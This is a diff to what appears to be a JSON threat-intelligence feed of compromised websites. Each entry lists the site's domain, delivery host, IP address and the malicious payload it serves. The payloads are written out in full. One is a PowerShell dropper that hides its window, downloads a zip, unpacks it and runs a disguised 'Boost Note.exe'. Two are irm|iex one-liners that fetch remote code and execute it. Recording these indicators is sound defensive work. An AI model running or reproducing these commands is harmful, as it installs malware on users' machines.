@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "www.attorneycollectionservices.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "176.9.86.61"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwj53tef17dk0omlyyz1wnrf",
+    "ScannedAt": "2026-11-16T10:47:58.057000+00:00"
+  },
+  {
+    "UrlDomain": "digitalfreedom.com.br",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/8pchkbdes5/6d9667cd120637a1"
+    ],
+    "IP": [
+      "104.21.63.151"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/8pchkbdes5/6d9667cd120637a1')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/8pchkbdes5/6d9667cd120637a1"
+    ],
+    "ReportId": "cmwj51q3c17cv0oml0cqeivw1",
+    "ScannedAt": "2026-11-16T10:46:20.560000+00:00"
+  },
+  {
     "UrlDomain": "www.atb.ikaya.nl",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -5057,24 +5095,5 @@
     ],
     "ReportId": "cmwdguwhj03zw0omlnorqrh3r",
     "ScannedAt": "2026-11-12T11:30:20.446000+00:00"
-  },
-  {
-    "UrlDomain": "thejoints.shop",
-    "DeliveryUrl": [
-      "nexguard.pro"
-    ],
-    "PayloadUrl": [
-      "https://nexguard.pro/Girya/ff9a9c33c814a1a4"
-    ],
-    "IP": [
-      "50.6.138.145"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
-    "ResolvedDownloadUrl": [
-      "https://nexguard.pro/Girya/ff9a9c33c814a1a4"
-    ],
-    "ReportId": "cmwdfg5is03uq0oml2mt1nbdk",
-    "ScannedAt": "2026-11-12T10:50:52.751000+00:00"
   }
 ]
